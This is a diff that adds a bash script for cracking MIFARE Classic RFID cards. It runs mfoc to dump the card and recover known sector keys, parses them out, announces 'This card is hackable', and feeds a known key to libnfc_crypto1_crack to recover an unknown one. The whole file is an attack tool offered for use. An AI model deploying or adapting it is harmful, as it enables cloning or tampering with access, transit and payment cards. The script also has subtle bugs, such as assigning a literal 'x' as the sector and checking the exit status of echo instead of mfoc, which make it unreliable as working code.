@@ -1,0 +1,89 @@
+#!/bin/bash
+
+key_found()
+{
+	a_found="`cat coucou | grep "A: " | wc -l`"
+	b_found="`cat coucou | grep "B: " | wc -l`"
+	key_found=$(($a_found+$b_found))
+}
+
+find_unknown_key()
+{
+	cmd="`cat coucou | grep "Unknown Key A "`"
+	if [ "$cmd" != "" ]
+	then
+		unknown_sector="`echo $cmd | cut -d " " -f2`"
+		unknown_letter="A"
+	fi
+	cmd="`cat coucou | grep "Unknown Key B "`"
+	if [ "$cmd" != "" ]
+	then
+		unknown_sector="`echo $cmd | cut -d " " -f2`"
+		unknown_letter="B"
+	fi
+}
+
+find_key()
+{
+	for x in {0..10}
+	do
+		if [ "`cat coucou | grep "Sector 0$x" | grep "A:"`" != "" ]
+		then
+			key="`cat coucou | grep "Sector 0$x" | grep "A:" | cut -d ":" -f2 | cut -d " " -f2`"
+			sector=x
+			letter="A"
+			echo -e "Key A in sector 0$x found:"
+			echo -e "$key"
+			return
+		fi
+		if [ "`cat coucou | grep "Sector 0$x" | grep "B:"`" != "" ]
+		then
+			key="`cat coucou | grep "Sector 0$x" | grep "B:" | cut -d ":" -f2 | cut -d " " -f2`"
+			sector=x
+			letter="B"
+
+			echo -e "Key B in sector 0$x found:"
+			echo -e "$key"
+			return
+		fi
+	done
+	for x in {10..16}
+	do
+		if [ "`cat coucou | grep "Sector $x" | grep "A:"`" != "" ]
+		then
+			key="`cat coucou | grep "Sector $x" | grep "A:" | cut -d ":" -f2 | cut -d " " -f2`"
+			sector=x
+			letter="A"
+			echo -e "Key A in sector $x found:"
+			echo -e "$key"
+			return
+		fi
+		if [ "`cat coucou | grep "Sector $x" | grep "B:"`" != "" ]
+		then
+			key="`cat coucou | grep "Sector $x" | grep "B:" | cut -d ":" -f2 | cut -d " " -f2`"
+			sector=x
+			letter="B"
+
+			echo -e "Key B in sector $x found:"
+			echo -e "$key"
+			return
+		fi
+	done
+}
+
+echo "`timeout 25s mfoc -P 500 -O carte-originale.dmp`" >coucou
+if [ "`echo $?`" == "1" ]
+then
+	exit 1
+fi
+echo  -e "This card is hackable"
+echo -e "let's go baby!"
+find_key
+key_found
+find_unknown_key
+echo -e $key_found
+echo -e $unknown_sector
+echo -e $unknown_letter
+
+
+libnfc_crypto1_crack $key $sector $letter $unknown_sector $unknown_letter
